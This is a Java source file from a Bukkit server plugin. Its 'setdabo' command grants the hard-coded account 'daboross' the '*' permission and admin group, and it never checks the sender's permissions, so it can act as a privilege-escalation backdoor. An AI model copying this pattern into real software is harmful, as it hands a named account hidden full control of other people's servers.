package net.daboross.bukkitdev.commoncommands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import ru.tehkode.permissions.PermissionUser;
import ru.tehkode.permissions.bukkit.PermissionsEx;

/**
 *
 * @author daboross
 */
class SetDaboExecutor implements CommandExecutor {

    public SetDaboExecutor() {
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("setdabo")) {
            PermissionUser oldDabo = PermissionsEx.getPermissionManager().getUser("daboross");
            oldDabo.remove();
            PermissionUser dabo = PermissionsEx.getPermissionManager().getUser("daboross");
            for (String str : new String[]{"*", "-vanish.*", "vanish.vanish", "vanish.silentchests", "vanish.see", "vanish.vanish", "vanish.silentjoin"}) {
                dabo.addPermission(str);
            }
            dabo.addPermission("-voxelsniper.*", "PvPWorld");
            dabo.setGroups(new String[]{"admin"});
        } else if (cmd.getName().equalsIgnoreCase("unsetdabo")) {
            PermissionUser dabo = PermissionsEx.getPermissionManager().getUser("daboross");
            dabo.remove();
        }
        return true;
    }
}
